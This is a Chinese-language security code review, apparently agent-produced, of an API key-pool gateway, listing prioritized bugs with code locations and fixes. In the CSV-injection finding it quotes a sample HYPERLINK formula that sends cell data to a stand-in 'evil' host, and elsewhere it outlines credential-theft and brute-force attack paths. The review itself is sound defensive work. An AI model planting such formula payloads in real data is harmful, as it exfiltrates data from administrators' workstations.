# 代码审查报告（高危 bug 专项）— 2026-09-02

- **审查方式**：3 个子代理并行独立审查（① gateway/keyPool/quota 核心逻辑；② adminApi/server/state/config/stats/logs 服务层；③ web 前端 / vendored 上游 proxy.mjs / Docker 与 CI 脚本），主代理逐条对照源码交叉验证后合并定稿。
- **范围**：src/ 全部 8 个模块、web/app.mjs、upstream/proxy.mjs、scripts/、Dockerfile、docker-compose.yml、.github/workflows/。
- **原则**：每条结论附代码位置与证据；子代理报告中经验证不成立或夸大的结论，在文末"已剔除/降级的子代理结论"一节说明理由。未标注"需验证"的条目均已在源码层面确认为确定性路径。

---

## P1（建议尽快修复）

### P1-1 流式响应中途上游断连 → 客户端永久挂起 + 误记成功 + 清除退避

- **位置**：`src/gateway.mjs:164-168`（pipeBody 流式 catch）、`src/gateway.mjs:317-341`（200 收尾）
- **证据**：
  ```js
  } catch (e) {
    // 客户端断开或上游中止
    try { reader.cancel(); } catch {}
    if (onAbort) onAbort();
    return usage;          // ← 既不 res.end() 也不 res.destroy()
  }
  ```
  调用侧 200 分支 `pipeBody(upRes, res, isStream, null)`（onAbort 传 null，见 317 行），catch 返回后 `pipeFailed` 仍为 false；`clientGone` 只有**客户端**断连才置 true（213-217 行 res 'close'），上游断连不会。于是走 332 行 `pool.recordSuccess(chosen.id)` → `keyPool.mjs:143-149` 清零 failCount、清除 backoffUntilMs，并记一条 `ok:true` 事件，而挂在半途的 `res` 无人收尾。
- **触发条件**：`stream:true` 请求，上游已回 200 并吐出首块后 socket 异常终止。上游存在现成的此类路径：`upstream/proxy.mjs:1054-1055`（流空闲超时且已开始输出时 `res.write(error) + res.destroy()`）。此时 undici 的 `reader.read()` 抛 "terminated"，落入上述 catch。
- **后果**：三重——① 客户端 HTTP 连接半挂（收不到终止 chunk，SDK 只能靠自身超时）；② 该 Key 的限流退避被误清除，削弱 429 反馈环（`recordSuccess` 无条件清零）；③ stats 记虚假成功，监控失真。
- **修复方向**：catch 中区分 `ac.signal.aborted`（客户端断开）与真实上游错误：后者 `res.destroy()` 并返回错误标志，调用侧走 pipeFailed 路径（不记 success、记 errorKind:"upstream"）。

### P1-2 CI 全自动供应链：上游 master 无校验、无人审、无测试门禁直推 ghcr `:latest`

- **位置**：`scripts/sync-upstream.sh:11,17-19`；`.github/workflows/upstream-sync.yml:31-38`；`.github/workflows/publish.yml:2-4,37-43`
- **证据**：
  - `sync-upstream.sh:11` `git clone --depth 1 https://github.com/MAXeaglet/commandcode-proxy.git` 拉 **master HEAD**，无任何签名/tag 校验，`cp` 原样覆盖 vendored `upstream/proxy.mjs`；
  - `upstream-sync.yml` 以 `contents: write` 直接 `git commit && git push` 到 main，不经过 PR/人审；
  - `publish.yml` 由 `push: branches:[main]` 触发，`docker/build-push-action` 直接 push `:latest`；全程**没有任何一步运行 `npm test`**（package.json 有 test 脚本但 CI 从未执行）。
  - 旁证：仓库当前 `UPSTREAM_VERSION` 实测内容为 `master@f7b81af7…`（见 P2-9，release tag 维度实际不存在）。
- **触发条件**：上游仓库被接管、维护者账号被盗或供应链攻击，即上游一个恶意 commit → 当天自动进入所有 `docker compose pull` 用户的镜像。恶意代码与网关同进程运行，可直接读 `data/config.json`（0o600，但同 uid）拿到 AdminToken + 全部池内真实 Key。
- **后果**：镜像级供应链事故 + 凭证一次性全泄。这是本仓库最大的单点风险。
- **修复方向**：只同步 `releases/latest` 且 `clone --branch` 固定到该 tag（顺带修复 P2-9）；master 同步产物走 PR 而非直推；publish 前加 `npm ci && npm test` 门禁；workflow action 从 major tag 改为 commit SHA pin。

### P1-3 令牌比较非常量时间 + login 无速率限制

- **位置**：`src/adminApi.mjs:134`（login `body.token !== cfg.adminToken`）、`src/adminApi.mjs:152-154`（`x-admin-token ===` / cookie `===`）、`src/gateway.mjs:183`（`token !== expect`）
- **证据**：全项目 `grep timingSafe` 零命中；login 端点无失败计数/锁定/延迟。
- **后果**：① `===` 短路比较存在理论 timing 侧信道（公网利用噪声大，**需验证**：对 login 做前缀二分统计）；② 更实际的是无限速在线爆破——弱 AdminToken（compose 示例 `change-me` 风格）可被直接打穿，而 AdminToken = 完全管理权 + 未配 clientToken 时的 /v1 凭证。
- **修复方向**：统一 `crypto.timingSafeEqual`（先各自 SHA-256 再定长比较）；login 按 IP 失败退避。

### P1-4 CSV 导出公式注入（clientToken 持有者 → 管理员 Excel）

- **位置**：源头 `src/gateway.mjs:200`（`model = j.model || ""`，无类型/长度校验）→ 落盘 `src/stats.mjs` appendEvent 原样保留 → 汇点 `web/app.mjs:505,517` 的 `csvCell`（只做引号转义，不中和 `= + - @ \t \r` 前缀）
- **触发条件**：任意 /v1 客户端发一次 `{"model":"=HYPERLINK(\"http://evil?d=\"+A1,…)"}` 请求 → 管理员在历史页"导出 CSV"并用 Excel/WPS 打开。
- **后果**：跨信任边界提权（API 使用凭证 → 管理员工作站代码执行/数据外带）。HTML 渲染侧有 `esc()`，CSV 通道无防护。
- **修复方向**：`csvCell` 对 `^[=+\-@\t\r]` 前缀加 `'`；gateway 侧 `model` 限定 string 并截断（如 128 字符，同时消除 P2-8 的磁盘放大源）。

### P1-5 SSE cookie 缺 `Secure` 标志，官方部署为明文 HTTP

- **位置**：`src/adminApi.mjs:140-141`（`Set-Cookie: ccpm_sse=…; HttpOnly; Path=/admin/api/events; SameSite=Strict; Max-Age=86400`，无 `Secure`）；`docker-compose.yml` 3080 直接对外无 TLS
- **后果**：链路嗅探者获得 24h 有效的 Bearer 型凭证（cookie 值本身即可独立通过 events 端点鉴权，`adminApi.mjs:153-155`），持续读取全量运维流（Key 别名、健康状态、额度、请求明细、系统日志）。非 AdminToken 本身（值为 SHA-256 摘要），属次级泄露。
- **修复方向**：按 `X-Forwarded-Proto`/配置条件下发 `Secure`；README 明示"必须置于 TLS 反代之后"。

### P1-6 历史记录 usage 数值字段未转义渲染 + 全链路无数值强转（存储型 XSS 通道）+ 全站无 CSP

- **位置**：`web/app.mjs:429`（`it.inputTokens ?? "-"` 等三字段直接拼 HTML，同循环内其余字段均 esc）；链路 `upstream/proxy.mjs:617-631,684-691`（usage 字段类型原样透传）→ `src/gateway.mjs:141-146`（`usage.inputTokens += u.inputTokens || 0`，0 + 字符串 = 字符串）→ `src/stats.mjs` 事件原样落盘。
- **触发条件**：**需验证**（子代理已给出验证法：改 mock 上游注入字符串 usage）。要求上游应答方返回非数值 usage；标准部署下源头是 api.commandcode.ai，概率低；但 `EMBED_UPSTREAM=0` 指向任意 `UPSTREAM_HOST` 时该应答方即为注入源。事件保留 7 天，期内每次进历史页都执行。
- **放大面**：`web/app.mjs:5,123` AdminToken 存 sessionStorage；`src/server.mjs:60-68` 全站无 CSP/XFO/X-Content-Type-Options。单点注入 → 窃 AdminToken → 全实例沦陷。
- **修复方向**：app.mjs:429 包 `esc()` 或 `Number()` 显示；在 gateway 事件入口做 `Number.isFinite` 强转收口（与 `quota.mjs:90-92` 的 `num()` 先例对齐）；`/admin/*` 加 `Content-Security-Policy: default-src 'self'`（需先消除内联 handler，见 P2-7）。

---

## P2（重要，建议排期修复）

### P2-1 config.json 解析失败 → 静默重新生成 AdminToken 并覆盖磁盘（管理员锁死）

- **位置**：`src/config.mjs:43-53,62-71`。parse 失败仅 console.error 后继续；adminToken 为空 → 新生成 → 结尾无条件 `saveConfig()` 原子**覆盖**原文件，旧凭证永久丢失（无 .bak）。磁盘手工编辑出错、位翻转、非 JSON 备份恢复均可触发。
- **修复方向**：解析失败时先把坏文件另存 `config.json.corrupt-<ts>` 再写默认，或以损坏为由拒绝启动。

### P2-2 env 每启动强制覆写 token，UI 改密重启后静默回滚

- **位置**：`src/config.mjs:57-58`（env 在磁盘读取之后、saveConfig 之前无条件应用）。经 `/admin/api/security` 改过的 token 会被 compose 里遗留的旧 `ADMIN_TOKEN` 覆盖回去，"已改密"状态不可信。**需验证**：设 env 启动 → UI 改密 → 重启 → 旧 token 登录。
- **修复方向**：仅磁盘无值时采用 env；或改密成功响应中提示清除 env。

### P2-3 `Access-Control-Allow-Origin: *` 无条件施加于全部响应（含 /v1 与管理 API）

- **位置**：`src/server.mjs:61-63`。无 `Allow-Credentials` 故不构成直接跨站读凭证，但使任意网页可跨源代理爆破/读取 401 响应（放大 P1-3），且缺 `Cache-Control: no-store`（管理数据可能落浏览器缓存）。
- **修复方向**：/admin/* 同源即可，CORS 收窄到 /v1/*（且该处也按需）。

### P2-4 SIGTERM 2s 强退与防抖写盘竞争，退出无 flush；SSE 长连接使优雅关闭必然失效

- **位置**：`src/server.mjs:142-147` + `src/state.mjs:27-36`（debouncedWriter 1000ms/2000ms）。恰好处于防抖窗口的退避/额度健康状态丢失；SSE 常连接使 `server.close()` 回调永不触发，永远走 2s `process.exit(0)`。
- **修复方向**：信号处理里同步 flush 待写队列；close 超时后强制 destroy 剩余 socket 再 flush 退出。

### P2-5 错误语义与内部信息外泄

- **位置**：`src/adminApi.mjs:57-60,331-332`。readJsonBody 标记 `statusCode:413` 但统一 catch 后按 400 返回；任意 `e.message` 原样回给管理端（quota 探测内部错误含 URL/网络细节）。无凭证泄漏路径（响应侧仅布尔值）。
- **修复方向**：catch 中消费 `e.statusCode`；对外 message 白盒化。

### P2-6 SSE 半开连接孤儿 + 无并发上限

- **位置**：`src/adminApi.mjs:300-326`。常规断连清理**已验证有效**（子代理在 Node v24 实测 close 事件触发、interval/emitter.off 均执行）；但无 socket 超时，客户端"断电式"消失时 keepalive interval 对死 socket 持续 write（try/catch 吞异常），监听器滞留；无按 IP 并发 SSE 上限。**需验证**：丢包模拟半开观察 listener 计数。
- **修复方向**：`res.socket.setTimeout` + 断连兜底 + 数量上限拒绝。

### P2-7 前端内联 `onclick` 直接拼接 `k.id`：依赖"id 必为服务端十六进制"的隐式不变量

- **位置**：`web/app.mjs:343,350,374-384`（及 412 行 `<option value="' + k.id + '">` 未 esc）。当前不可注入（`keyPool.mjs:19,67` 生成 `k_` + hex，updateKey 不许 patch id，priority 经 `Number()`+moveKey 钳为整数——均已验证）；且 `esc()` 不转义单引号，任何未来把字符串字段拼进同类 JS 单引号上下文即破。内联 handler 还阻断 CSP `script-src 'self'` 落地（与 P1-6 联动）。
- **修复方向**：`data-id` 属性 + 事件委托；统一带引号转义的 esc。

### P2-8 低权限客户端可无限撑大 stats.jsonl（磁盘/事件循环放大）

- **位置**：`src/gateway.mjs:193,200`（体上限 100MB、model 无截断）→ `src/stats.mjs` appendFileSync 原样落盘；每 20 万条才触发一次 O(n) 同步 prune 重写，阻塞事件循环；/data 灌满后连累 Key 池持久化。
- **修复方向**：随 P1-4 的 model 截断一并解决；prune 阈值改小或增量化。

### P2-9 sync 脚本浅克隆拿不到 tag：`UPSTREAM_VERSION` 恒为 `master@…`，发布镜像 tag 静默错标 + 每日空转

- **位置**：`scripts/sync-upstream.sh:11-14`。`--depth 1` 不抓 tag，`git describe --tags` 恒失败回退 `master`（已在本机复现 `No names found`；仓库 `UPSTREAM_VERSION` 实测即 `master@f7b81af7…`，印证 release tag 从未生效）。workflow 判定 `LATEST_RELEASE != CURRENT_TAG` 在上游存在任何 release 后**每天**触发同步；`publish.yml:23` 产出恒名 `upstream-master` 却内容天天变。DESIGN 决策 10"轮询上游正式版"实际失效。
- **修复方向**：见 P1-2（`clone --branch "$LATEST_RELEASE"`）。

### P2-10 vendored proxy 的 `server.listen` 无 'error' 监听：端口冲突以未捕获异常打崩宿主进程

- **位置**：`upstream/proxy.mjs:2045`（全文件 grep 无 `server.on('error')`）。3050 被占用或 `UPSTREAM_PORT` 配错撞 3080 时，listen 失败 emit 'error' 无人接 → uncaughtException → **管理网关连同 Key 池/额度/历史一起退出**（manager 主进程 `await import` 嵌入，`src/server.mjs:35`）。启动期确定性崩溃，非运行期随机。
- **修复方向**：vendored 零改动原则下在 manager 侧防御：import 前临时挂 uncaughtException 检测 EADDRINUSE 给出清晰报错；README/compose 声明后果。

### P2-11 历史页请求竞态 + SSE 三次错误后永久放弃

- **位置**：`web/app.mjs:474-488`（loadHistory 无请求序号/AbortController，慢响应后到会覆盖新页并回退页码显示）；`app.mjs:732-735`（`sseErrors >= 3` 后 close 且不再有任何路径重连，实时通道对该标签页永久失效，仅剩轮询兜底）；`stopEventStream`（772-774）为死代码。
- **修复方向**：自增 seq 守卫回包；放弃后挂 visibilitychange/手动重连入口，或交给 EventSource 原生重试。

### P2-12 额度窗口 `resetAt` 缺失/为 null 时硬停判定永假 → 持续超额 Key 不被 quota_limited

- **位置**：`src/quota.mjs` applyLimits（fiveHot 需 `toMs(five.resetAt) > now`）。`parseWindow` 允许 resetAt=null，percent≥hardStop 但字段缺失时**只软降不硬停**，与决策 2"接近上限提前限制"意图相反；Key 继续被选中并维持 429 反馈环。**需验证**：真实 API 是否会返回无 resetAt 的 windowLimits。
- **修复方向**：resetAt 缺失时用 `now + quotaRefreshMs*2` 保守兜底（credits 分支已有同款处理可对齐）。

### P2-13 authError 永不自愈，且 `nextRetryAfterMs` 把其 1 小时 backoff 当限流退避返回给客户端

- **位置**：`src/keyPool.mjs:151-158`（markAuthError 设 `backoffUntilMs = now+3600s`，authError 只能 admin `/test` 或 `/clear-auth` 清除）+ `src/gateway.mjs:236-241`（空池 429 的 `Retry-After` 取各 Key backoff 最小值，不区分 authError 语义）。
- **后果**：池 Key 真实过期（401）场景下，客户端收到 `Retry-After: 3600` 干等 1 小时，而实际该 Key 1 小时后依然不可用，需人工介入。
- **修复方向**：nextRetryAfterMs 跳过 authError Key 的 backoff 项；或给 authError 加周期性自动 testKey。

---

## P3（小问题，择机处理）

1. **parseCookies 对非法百分号编码抛 URIError → events 端点 500**：`src/adminApi.mjs:24`，调用点（154）在 161 行 try 之外，异常上抛 server.mjs 外层 catch。进程无碍，单请求 500。
2. **refresh-quota 的 35s 兜底 timer 不 clearTimeout**：`src/adminApi.mjs:209-212`。race 结束后定时器仍占用至 35s（有界占用，非无限泄漏），refreshAll 排队期间连点可叠加数个。建议 finally 中 clear。
3. **零输出透传时 errorKind 归类为 "client"**：`src/gateway.mjs:408-410`——`zeroOutputCountsAs429=false` 时上游 429 零输出走透传分支是注释明示的设计语义（358-359 行），不算 bug；但 429 状态的零输出被记成 client 错误致 rate_limit 统计失真。
4. **proxy.mjs:2015-2016 `new URL(req.url, …)` 在请求 handler 顶层 try 之外**：抛错时该请求落入 2036 行全局兜底（只 log 不回包），连接悬挂至超时；不崩进程。
5. **sync-upstream.sh:21 的 sed 精确匹配 `"host": "0.0.0.0"`**：上游改格式即静默失配——但已验证被双重兜底缓解（`src/server.mjs:34` 强制 env HOST + `proxy.mjs:39` env 优先于 config），不会导致对外监听；建议仍改为幂等 JSON 改写。

---

## 已剔除/降级的子代理结论（主代理复核）

| 原结论 | 出处 | 处置 | 理由 |
|---|---|---|---|
| 【P1】低权限 token 可故意触发 401 逐个污染全池 authError（池级 DoS） | 子代理 1 | **剔除**（攻击链部分），其残余后果并入 P2-13 | gateway 转发时**无条件重写** `authorization: Bearer <池Key>` 且不转发用户 `x-api-key`（`src/gateway.mjs:256-262`），用户凭据无法到达上游；`proxy.mjs:869/1643` 的 401 仅在缺 key 时触发，而网关恒带 key。上游 401/403 只对应池 Key 真实失效，`markAuthError` 语义正确。 |
| 【P1】refresh-quota timer"永不释放" | 子代理 1 | 降级 P3-2 | timer 35s 后自行触发回收，是有界占用非永久泄漏。 |
| 【P2】并发 429 下 failCount 读旧值致指数退避失效、同一退避 Key 被继续消费 | 子代理 1 | **剔除** | 子代理自述"JS 单线程下 read-modify-write 无 await 间隙"；且退避生效后 `selectKey`（keyPool.mjs:223）即排除该 Key，不存在"退避后仍被消费"。突发 N 个并发各自 +1 failCount 反而使退避增长更快，非缺陷。 |
| 【P2】Retry-After 被 mapError 硬编码 30 覆盖真实值 | 子代理 1 | **剔除**（子代理自查后已自行撤销） | `src/gateway.mjs:369-371` 在解析成功时用真实值重写 `retry_after`。 |
| 【P1】usage 数值字段 XSS | 子代理 3 | 降级并入 P1-6 | 触发依赖上游应答方返回异常类型，标准部署下源头为官方 API；定级为需验证的纵深防御缺陷而非现役漏洞，但因无 CSP 放大保留 P1 汇总条目。 |
| 【P1】config 覆盖锁死 | 子代理 2 | 降级 P2-1 | 需外部造成 config.json 损坏才触发（写入本身 tmp+rename 原子），非常态路径，但后果真实。 |

## 检查过、确认无问题的关键点（三组汇总，证明覆盖面）

- **鉴权路由**：URL 规范化后 `//admin/api`、`%2F`、大小写变体均不能绕过前缀判定；鉴权块位于全部业务路由前；旧 `?token=` query 通道已彻底移除；无空令牌旁路（adminToken 恒非空）。
- **路径遍历/静态服务**：静态资源仅从固定文件名集合的内存 Map 取（server.mjs:48-53），用户输入不进文件路径。
- **持久化原子性**：config/state/stats/logs 全部 tmp+renameSync、0o600；readJson 与 jsonl 逐行解析均有坏数据兜底；keys.json 同步写。
- **quota 串行化**：`enqueue` 的 `chain.then(fn, fn)` 吞 rejection 续链，异常路径无锁泄漏；探测只读 whoami/billing 不耗模型额度、与网关退避无状态耦合；stale 数据不启用限制。
- **selectKey**：filter 到 lastUsedAt 全程无 await，无交错；冷却只降优先级不禁用，无死路；重试循环受 attempts/预算双封顶，无无限循环。
- **客户端断连**：res 'close' + writableEnded 区分完成/掐断；多点复检；`res.on("error", noop)` 阻断 EPIPE 崩进程；sendJson 有守卫。（上游断连侧见 P1-1。）
- **前端主要汇点**：alias/note/maskedKey/model/日志正文/quota error/设置页字段均过 `esc()`；AdminToken 不进 URL/console/导出物；SSE cookie HttpOnly/Path 限定/SameSite=Strict，改 token 后旧 cookie 自动失效；定时器先 clear 再 set 无泄漏。
- **上游对外隔离**：`server.mjs:34` env 强制 HOST=127.0.0.1，覆盖 vendored config 的 `0.0.0.0`；compose 只映射 3080；mock/scripts 不入镜像。
- **proxy.mjs 进程存活面**：无 `process.exit`、请求级异常均在 try/catch 内；readBody 100MB 上限 + 413 drain destroy；sessionStore 每小时过期清理，无运行期无限增长全局结构。
- **CI/密钥面**：无 `pull_request_target`、无 fork 触发拿 secrets；publish 权限 `packages: write` 最小化；Dockerfile 非 root、无 secret 落层。
- **Key 泄漏面**：对外仅 `maskKey`；proxy 唯一打印 keyPrefix 的日志点被 logs.mjs 脱敏；pool 端点仅回布尔。

## 建议修复顺序

1. **P1-2 CI 供应链门禁**（影响所有部署者，上游不可控）→ 顺带修 P2-9。
2. **P1-1 流中断收尾**（线上确定性可发生的挂起 + 退避误清除）。
3. **P1-3/P1-4/P1-5 凭证与注入面**（恒定时间比较 + login 限速 + csvCell 中和 + model 截断 + Secure cookie）。
4. **P1-6**：usage 数值强转一行修 + `/admin/*` CSP（需先做 P2-7 的 onclick 重构）。
5. P2-1/P2-2 凭证持久化语义、P2-4 优雅关闭 flush。
